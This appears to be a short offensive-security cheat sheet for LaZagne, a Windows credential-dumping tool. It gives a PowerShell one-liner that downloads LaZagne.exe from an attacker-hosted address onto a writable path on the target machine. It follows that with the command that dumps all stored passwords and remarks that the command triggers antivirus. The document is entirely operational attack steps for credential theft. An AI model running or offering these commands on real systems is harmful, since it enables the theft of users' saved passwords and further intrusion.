# Lazagne

% lazagne, dump password
#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## download on disk

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://<local_ip>:<port|80>/windows/windows_weaponize/bin/LaZagne.exe','<windows_writable_path>/LaZagne.exe')
```

## dump all passwords (trigger av)
```
lazagne.exe all
```
